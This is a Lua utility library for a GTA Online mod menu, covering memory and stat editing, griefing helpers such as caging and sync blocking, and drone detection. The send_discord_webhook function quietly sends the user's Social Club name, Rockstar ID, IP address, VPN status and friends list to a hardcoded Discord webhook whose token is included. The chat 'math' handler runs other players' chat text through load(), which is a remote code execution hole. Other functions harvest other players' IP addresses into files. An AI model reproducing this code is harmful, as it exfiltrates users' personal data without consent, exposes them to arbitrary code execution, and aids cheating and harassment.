json = require "pretty.json"

local scriptdir <const> = filesystem.scripts_dir()
local lenaDir <const> = scriptdir .. "Lena\\"
if not filesystem.exists(lenaDir) then
	filesystem.mkdir(lenaDir)
end

if not filesystem.exists(lenaDir .. "Players") then
	filesystem.mkdir(lenaDir .. "Players")
end

function IA_MENU_OPEN_OR_CLOSE()
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 244, 1.0)
    wait(150)
end
function IA_MENU_UP(Num)
    for i = 1, Num do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 172, 1.0)
        wait(100)
    end
end
function IA_MENU_DOWN(Num)
    for i = 1, Num do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 173, 1.0)
        wait(100)
    end
end
function IA_MENU_LEFT(Num)
    for i = 1, Num do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 174, 1.0)
        wait(100)
    end
end
function IA_MENU_ENTER(Num)
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 176, 1.0)
    wait(100)
end

function play_anim(dict, name, duration)
    local ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        wait()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 1.0, 1.0, duration, 3, 0.5, false, false, false)
end

function BitTest(bits, place)
	return (bits & (1 << place)) ~= 0
end

function restartsession()
    local host = players.get_name(players.get_host())
    local script_host = players.get_name(players.get_script_host())
    trigger_commands("restartfm")
    notify("Restarting Session Scripts...")
    log("[Lena | Session Restart] Restating Session Scripts. Current Host and Script Host: "..host.." and "..script_host..".")
end

function getClosestVehicle(myPos)
    local closestDist = 999999999999
    local closestVeh = nil
    for entities.get_all_vehicles_as_pointers() as veh do
        local vehpos = entities.get_position(veh)
        local dist = myPos:distance(vehpos)
        if (dist < closestDist) then
            closestDist = dist
            closestVeh = veh
        end
    end
    if closestVeh ~= nil then
        return entities.pointer_to_handle(closestVeh)
    end
end

function request_control_once(entity)
	if not NETWORK.NETWORK_IS_IN_SESSION() then
		return true
	end
	local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
	NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
	return NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
end

function request_control(entity, timeOut)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return false
	end
	timeOut = timeOut or 500
	local start = newTimer()
	while not request_control_once(entity) and start.elapsed() < timeOut do
		wait_once()
	end
	return start.elapsed() < timeOut
end

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end

function pid_to_handle(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
    return handle_ptr
end

function BitTest(bits, place)
    return (bits & (1 << place)) ~= 0
end

function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end

function IsPlayerUsingOrbitalCannon(player)
    return BitTest(memory.read_int(memory.script_global((2657589 + (player * 466 + 1) + 427))), 0) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_427), 0
end

function get_spawn_state(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
end

function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245)) -- Global_2657589[bVar0 /*466*/].f_245
end

function DoesPlayerOwnMinitank(player)
    if player ~= -1 then
        local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 428 + 2)
        return BitTest(memory.read_int(address), 15)
    end
    return false
end

function trapcage(pid)
    local objHash <const> = util.joaat("prop_gold_cont_01")
    request_model(objHash)
    local pos = players.get_position(pid)
    local obj = entities.create_object(objHash, pos)
    ENTITY.FREEZE_ENTITY_POSITION(obj, true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
end

function mod_uses(type, incr)
    if incr < 0 and is_loading then
        return
    end
    if type == "vehicle" then
        if vehicle_uses <= 0 and incr < 0 then
            return
        end
        vehicle_uses = vehicle_uses + incr
    elseif type == "pickup" then
        if pickup_uses <= 0 and incr < 0 then
            return
        end
        pickup_uses = pickup_uses + incr
    elseif type == "ped" then
        if ped_uses <= 0 and incr < 0 then
            return
        end
        ped_uses = ped_uses + incr
    elseif type == "player" then
        if player_uses <= 0 and incr < 0 then
            return
        end
        player_uses = player_uses + incr
    elseif type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end

function SetLocalInt(script_str, script_local, value)
    local addr = memory.script_local(script_str, script_local)
    if addr ~= 0 then
        memory.write_int(addr, value)
    end
    return addr ~= 0
end

function GET_INT_LOCAL(Script, Local)
    if memory.script_local(Script, Local) ~= 0 then
        local Value = memory.read_int(memory.script_local(Script, Local))
        if Value ~= nil then
            return Value
        end
    end
end

function GetLocalInt(script_str, script_local)
    local addr = memory.script_local(script_str, script_local)
    return addr ~= 0 and memory.read_int(addr) or nil
end

function getMPX()
    return 'MP'.. util.get_char_slot() ..'_'
end

function STAT_GET_INT(Stat)
    local Int_PTR = memory.alloc_int()
    STATS.STAT_GET_INT(joaat(getMPX() .. Stat), Int_PTR, -1)
    return memory.read_int(Int_PTR)
end

function IS_MPPLY(Stat)
    local Stats = {
        "MP_PLAYING_TIME",
    }
    for i = 1, #Stats do
        if Stat == Stats[i] then
            return true
        end
    end
    if string.find(Stat, "MPPLY_") then
        return true
    else
        return false
    end
end

function ADD_MP_INDEX(Stat)
    if not IS_MPPLY(Stat) then
        Stat = "MP" .. util.get_char_slot() .. "_" .. Stat
    end
    return Stat
end

function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end
function SET_FLOAT_GLOBAL(Global, Value)
    memory.write_float(memory.script_global(Global), Value)
end

function GET_INT_GLOBAL(Global)
    return memory.read_int(memory.script_global(Global))
end

function SET_PACKED_INT_GLOBAL(StartGlobal, EndGlobal, Value)
    for i = StartGlobal, EndGlobal do
        SET_INT_GLOBAL(262145 + i, Value)
    end
end

function SET_INT_LOCAL(Script, Local, Value)
    if memory.script_local(Script, Local) ~= 0 then
        memory.write_int(memory.script_local(Script, Local), Value)
    end
end

function SET_FLOAT_LOCAL(Script, Local, Value)
    if memory.script_local(Script, Local) ~= 0 then
        memory.write_float(memory.script_local(Script, Local), Value)
    end
end

function STAT_SET_INT(Stat, Value)
    STATS.STAT_SET_INT(joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_FLOAT(Stat, Value)
    STATS.STAT_SET_FLOAT(joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_BOOL(Stat, Value)
    STATS.STAT_SET_BOOL(joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_STRING(Stat, Value)
    STATS.STAT_SET_STRING(joaat(ADD_MP_INDEX(Stat)), Value, true)
end

function SET_FLOAT_GLOBAL(Global, Value)
    memory.write_float(memory.script_global(Global), Value)
end

function get_seat_ped_is_in(ped)
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    local hash = ENTITY.GET_ENTITY_MODEL(veh)
    local seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(hash)

    if veh == 0 then return false end

    for i = -1, seats - 2, 1 do
        if VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, i, false) == ped then return true, i end
    end
    return false
end

function first_to_upper(str)
    return (str:gsub("^%l", string.upper))
end

function request_animation(hash)
    STREAMING.REQUEST_ANIM_DICT(hash)
    while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
        wait()
    end
end

function get_vtable_entry_pointer(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end

function get_sub_handling_types(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}

    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)

        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)

            if type and type == result then return sub_handling_data end

            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil end
    return types
end

function BlockSyncs(pid, callback)
    for _, i in players.list(false, true, true) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            trigger_command(outSync, "on")
        end
    end
    wait(10)
    callback()
    for _, i in players.list(false, true, true) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            trigger_command(outSync, "off")
        end
    end
end

function memoryScan(name, pattern, callback)
	local address = memory.scan(pattern)
	assert(address ~= NULL, "memory scan failed: " .. name)
	callback(address)
end

function is_entity_a_projectile(hash)
    local all_projectile_hashes = {
        joaat("w_ex_vehiclemissile_1"),
        joaat("w_ex_vehiclemissile_2"),
        joaat("w_ex_vehiclemissile_3"),
        joaat("w_ex_vehiclemissile_4"),
        joaat("w_ex_vehiclem,tar"),
        joaat("w_ex_apmine"),
        joaat("w_ex_arena_landmine_01b"),
        joaat("w_ex_birdshat"),
        joaat("w_ex_grenadefrag"),
        joaat("w_ex_grenadesmoke"),
        joaat("w_ex_molotov"),
        joaat("w_ex_pe"),
        joaat("w_ex_pipebomb"),
        joaat("w_ex_snowball"),
        joaat("w_lr_rpg_rocket"),
        joaat("w_lr_homing_rocket"),
        joaat("w_lr_firew,k_rocket"),
        joaat("xm_prop_x17_silo_rocket_01")
    }
    return table.contains(all_projectile_hashes, hash)
end

function format_friends_list()
    local friend_count = NETWORK.NETWORK_GET_FRIEND_COUNT()
    local friend_list = {}

    for i = 0, friend_count - 1 do
        local friend_name = NETWORK.NETWORK_GET_FRIEND_DISPLAY_NAME(i)
        local friend_url = "https://socialclub.rockstargames.com/member/" .. friend_name
        table.insert(friend_list, "[" .. friend_name .. "](" .. friend_url .. "), ")

        if (i + 1) % 3 == 0 then
            table.insert(friend_list, "\n")
        end
    end

    return table.concat(friend_list, " ")
end

function user_ip()
    local connectIP = players.get_connect_ip(players.user())
    local ipStringuser = string.format("%d.%d.%d.%d",
    math.floor(connectIP / 2^24) % 256,
    math.floor(connectIP / 2^16) % 256,
    math.floor(connectIP / 2^8) % 256,
    connectIP % 256)
    return ipStringuser
end

function player_ip(pid)
    local connectIP = players.get_connect_ip(pid)
    local ipStringplayer = string.format("%d.%d.%d.%d",
    math.floor(connectIP / 2^24) % 256,
    math.floor(connectIP / 2^16) % 256,
    math.floor(connectIP / 2^8) % 256,
    connectIP % 256)
    return ipStringplayer
end

function money_drop_auto_reply(packet_sender, text, team_chat, networked)
    if not money_drop_reply then
        return
    end

    if not players.get_name(packet_sender) == players.get_name(players.user()) then
        local lowercase_text = string.lower(text)
        if string.find(lowercase_text, "money drop") or 
        string.find(lowercase_text, "mone drop") or 
        string.find(lowercase_text, "money drpo") then
            chat.send_message("Money drops are a waste of time and risky. They offer little reward and often result in lost progress. Even if I were to participate in money drops, I wouldn't because they are simply a waste of time. Stick to safer and more profitable options.", false, true, true)
        else
            notify("Error")
        end
    end
end

function on_math_message(sender, reserved, text, team_chat, networked, is_auto)
    if not math_reply then
        return
    end

    local lowercase_text = string.lower(text)
    local prefix = "@vel "
    if string.sub(lowercase_text, 1, #prefix) == prefix then
        local expression = string.sub(lowercase_text, #prefix + 1)

        local result, error_message = load("return " .. expression)()

        if result then
            chat.send_message("That expression evaluates to " .. tostring(result) .. ". :)", false, true, true)
        else
            chat.send_message("Sorry, I couldn't evaluate that expression", false, true, true)
            log("[Lena | Math] Error trying to evaluate an expression. Error: "..error_message)
        end
    end
end

function get_vehicles_in_player_range(player, radius)
	local vehicles = {}
	local pos = players.get_position(player)
	for _, vehicle in entities.get_all_vehicles_as_handles() do
		local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
		if pos:distance(vehPos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end

function send_discord_webhook()
    local player_name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
    local player_id = players.get_rockstar_id(players.user())
    local using_vpn = players.is_using_vpn(players.user())
    local apiurl = "https://ipapi.co/"..user_ip()
    local IPv4url = "[" .. user_ip() .. "](" .. apiurl .. ")"
    local friend_list = format_friends_list()

    local json_data = {
        ["username"] = player_name,
        --["avatar_url"] = "https://i.imgur.com/5kiNwQE.png",
        ["embeds"] = {{
            ["title"] = player_name,
            ["url"] = "https://socialclub.rockstargames.com/member/" .. player_name,
            ["color"] = 15357637,
            ["fields"] = {{
                ["name"] = "RID",
                ["value"] = player_id,
                ["inline"] = false
            }, {
                ["name"] = "VPN",
                ["value"] = using_vpn and "Yes" or "No",
                ["inline"] = true
            }, {
                ["name"] = "IPv4",
                ["value"] = IPv4url,
                ["inline"] = true
            }, {
                ["name"] = "Friends",
                ["value"] = friend_list,
                ["inline"] = false
            }}
        }}
    }

    local json_string = json.stringify(json_data)

    async_http.init("discord.com", "/api/webhooks/1084525001128017982/GOaYBeykjtFwfRKv_oS1FU6yj07ls2jVjyTSM6lrsUUEclqETEv27M9kkR-3EvJm9pNw", function(body, header_fields, status_code)
        --print("Discord Webhook sent successfully!")
    end, function(error_msg)
        --print("Discord Webhook error: " .. error_msg)
    end)

    async_http.set_post("application/json", json_string)
    async_http.dispatch()
end


-- Chat Webhook
-- Load the webhook URL from the file or create a new file if it doesn't exist
chfile = io.open(lenaDir.."webhook.txt", "r")
if not chfile then
    chfile = io.open(lenaDir.."webhook.txt", "w")
    chfile:close()
    chfile = io.open(lenaDir.."webhook.txt", "r")
end

local webhook_url = chfile:read("*all")
chfile:close()

local json = require("json")
function send_to_discord_webhook(packet_sender, message_sender, message_text, is_team_chat)
    -- Check if the webhook is enabled
    if not webhook_enabled then
        return
    end
    
    local divider = " [ALL] "
    if is_team_chat then
        divider = " [TEAM] "
    end
    local player_name = players.get_name(packet_sender)
    local message = player_name .. divider .. message_text

    --[[local webhook_host = "discord.com"
    local webhook_path = "/api/webhooks/1084525217235353702/1H0VN3oeTZRz-i_5fs_pI_tspKW6a7A7oJYJq4Y4Y3UX9ygs-gb3EniQEn3eHlWcQGId"]]
    local content_type = "application/json"
    local payload = json.encode({content = message})
    local headers = {
        ["Content-Type"] = content_type,
        ["Content-Length"] = #payload
    }

    async_http.init(webhook_url,
        function(body, header_fields, status_code)
            -- Success
        end,
        function(error_msg)
            -- Fail
        end)
    async_http.set_post(content_type, payload)
    for key, value in pairs(headers) do
        async_http.add_header(key, value)
    end
    async_http.dispatch()
end

function save_player_info(pid)
    -- Get the player's information
    local name_with_tags = players.get_name_with_tags(pid)
    local name = players.get_name(pid)
    local rockstar_id = players.get_rockstar_id(pid)
    local is_modder = players.is_marked_as_modder(pid)
    local rank = players.get_rank(pid)
    local money = players.get_money(pid)
    local moneyStr = ""
    if money >= 1000000000 then
        moneyStr = string.format("%.1fb", money / 1000000000)
    elseif money >= 1000000 then
        moneyStr = string.format("%.1fm", money / 1000000)
    elseif money >= 1000 then
        moneyStr = string.format("%.1fk", money / 1000)
    else
        moneyStr = tostring(money)
    end
    local kd = players.get_kd(pid)
    local is_using_vpn = players.is_using_vpn(pid)
    local player_ip = player_ip(pid)
    local language_int = players.get_language(pid)
    local is_attacker = players.is_marked_as_attacker(pid)
    local host_token = players.get_host_token_hex(pid)
    local is_using_controller = players.is_using_controller(pid)
    local clan_motto = players.clan_get_motto(pid)
  
    -- Mapping the language integer to a string
    local language = {
        [0] = "English",
        [1] = "French",
        [2] = "German",
        [3] = "Italian",
        [4] = "Spanish",
        [5] = "Brazilian",
        [6] = "Polish",
        [7] = "Russian",
        [8] = "Korean",
        [9] = "Chinese (T)",
        [10] = "Japanese",
        [11] = "Mexican",
        [12] = "Chinese (S)"
    }
    local language_str = language[language_int]
  
    local filename = name .. ".txt"
    local filepath = lenaDir .. "Players/" .. filename
  
    if filesystem.exists(filepath) then
        notify(string.format("Error: %s's information has already been saved to file.", name))
    else
        if not filesystem.exists(lenaDir .. "Players") then
            filesystem.mkdir(lenaDir .. "Players")
        end
  
        -- Create the file and write the player's information to it
        -- There is probably a better way to do this, but it works, so I won't re-write it
        local file = io.open(filepath, "w")
        file:write(os.date("%a, %d. %B %X"), "\n\n")
        file:write("Name with Tags: ", name_with_tags, "\n")
        file:write("ID: ", rockstar_id, "\n")
        file:write("Is Modder: ", is_modder and "Yes" or "No", "\n")
        file:write("Rank: ", rank, "\n")
        file:write("Money: ", moneyStr, "\n")
        file:write("K/D: ", kd, "\n")
        file:write("Is Using VPN: ", is_using_vpn and "Yes" or "No", "\n")
        file:write("IPv4: ", player_ip, "\n")
        file:write("Language: ", language_str, "\n")
        file:write("Is Attacker: ", is_attacker and "Yes" or "No", "\n")
        file:write("Host Token: ", host_token, "\n")
        file:write("Is Using Controller: ", is_using_controller and "Yes" or "No", "\n")
        file:write("Clan Motto: ", clan_motto, "\n")
        file:close()
    
        -- Display a toast message to confirm that the file has been saved
        notify(string.format("%s's information has been saved to file.", name))
    end
end

function is_player_passive(player)
	if player ~= players.user() then
		local address = memory.script_global(1894573 + (player * 608 + 1) + 8)
		if address ~= NULL then return memory.read_byte(address) == 1 end
	else
		local address = memory.script_global(1574582)
		if address ~= NULL then return memory.read_int(address) == 1 end
	end
	return false
end

function is_player_in_any_interior(player)
	local address = memory.script_global(2657589 + (player * 466 + 1) + 245)
	return address ~= NULL and memory.read_int(address) ~= 0
end

-- Weapon Speed Modifier
AmmoSpeed = {address = 0, defaultValue = 0}
AmmoSpeed.__index = AmmoSpeed

AmmoSpeed.__eq = function (a, b)
    return a.address == b.address
end

function AmmoSpeed.new(address)
    assert(address ~= 0, "got a nullpointer")
    local instance = setmetatable({}, AmmoSpeed)
    instance.address = address
    instance.defaultValue = memory.read_float(address)
    return instance
end
function AmmoSpeed:getValue()
    return memory.read_float(self.address)
end

function AmmoSpeed:setValue(value)
    memory.write_float(self.address, value)
end

function AmmoSpeed:reset()
    memory.write_float(self.address, self.defaultValue)
end

-- Drone and TV Detection
notificationBits = 0
nearbyNotificationBits = 0
blips = {}

function isPlayerFlyingAnyDrone(player)
    local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 365)
    return BitTest(memory.read_int(address), 26)
end

function getDroneType(player)
    local p_type = memory.script_global(1914091 + (player * 297 + 1) + 97)
    return memory.read_int(p_type)
end

function getPlayerDroneObject(player)
    local p_object = memory.script_global(1914091 + (players.user() * 297 + 1) + 64 + (player + 1))
    return memory.read_int(p_object)
end

function invertHeading(heading)
    if heading > 180.0 then
        return heading - 180.0
    end
    return heading + 180.0
end

function getDroneBlipSprite(droneType)
    return (droneType == 8 or droneType == 4) and 548 or 627
end

function getNotificationMsg(droneType, nearby)
    if droneType == 8 or droneType == 4 then
        return nearby and "%s's guided missile is ~r~nearby~s~." or "%s is using a guided missile."
    end
    return nearby and "%s's drone is ~r~nearby~s~." or "%s is flying a drone."
end

function removeBlipIndex(index)
    if HUD.DOES_BLIP_EXIST(blips[index]) then
        util.remove_blip(blips[index]); blips[index] = 0
    end
end

-- This function adds a blip for a player's drone
function addBlipForPlayerDrone(player)
    -- If there is no blip for this player, set its value to 0
    if not blips[player] then
        blips[player] = 0
    end

    -- If the player is active, not the user, and is flying a drone
    if is_player_active(player, true, true) and players.user() ~= player and isPlayerFlyingAnyDrone(player) then
        -- Get the player's drone object, position and heading
        if ENTITY.DOES_ENTITY_EXIST(getPlayerDroneObject(player)) then
            local obj = getPlayerDroneObject(player)
            local pos = ENTITY.GET_ENTITY_COORDS(obj, true)
            local heading = invertHeading(ENTITY.GET_ENTITY_HEADING(obj))

            -- If the blip for this player does not exist, create it and set its properties
            if not HUD.DOES_BLIP_EXIST(blips[player]) then
                blips[player] = HUD.ADD_BLIP_FOR_ENTITY(obj)
                local sprite = getDroneBlipSprite(getDroneType(player))
                HUD.SET_BLIP_SPRITE(blips[player], sprite)
                HUD.SHOW_HEIGHT_ON_BLIP(blips[player], false)
                HUD.SET_BLIP_SCALE(blips[player], 0.8)
                HUD.SET_BLIP_NAME_TO_PLAYER_NAME(blips[player], player)
                HUD.SET_BLIP_COLOUR(blips[player], get_player_org_blip_colour(player))

            -- If the blip for this player already exists, update its properties
            else
                HUD.SET_BLIP_DISPLAY(blips[player], 2)
                HUD.SET_BLIP_COORDS(blips[player], pos.x, pos.y, pos.z)
                HUD.SET_BLIP_ROTATION(blips[player], math.ceil(heading))
                HUD.SET_BLIP_PRIORITY(blips[player], 9)
            end

            -- If the player is not already notified and the blip exists, show the notification and set the notification bit
            if not BitTest(nearbyNotificationBits, player) and HUD.DOES_BLIP_EXIST(blips[player]) then
                local msg = getNotificationMsg(getDroneType(player), true)
                notification:normal(msg, HudColour.purpleDark, get_condensed_player_name(player))
                nearbyNotificationBits = SetBit(nearbyNotificationBits, player)
            end

        -- If the player's drone object does not exist, remove the blip and clear the nearby notification bit
        else
            removeBlipIndex(player)
            nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
        end

        -- If the player is not already notified, show the notification and set the notification bit
        if not BitTest(notificationBits, player) then
            local msg = getNotificationMsg(getDroneType(player), false)
            notification:normal(msg, HudColour.purpleDark, get_condensed_player_name(player))
            notificationBits = SetBit(notificationBits, player)
        end

    -- If the player is not active or not flying a drone, remove the blip and clear the notification bits
    else
        removeBlipIndex(player)
        notificationBits = ClearBit(notificationBits, player)
        nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
    end
end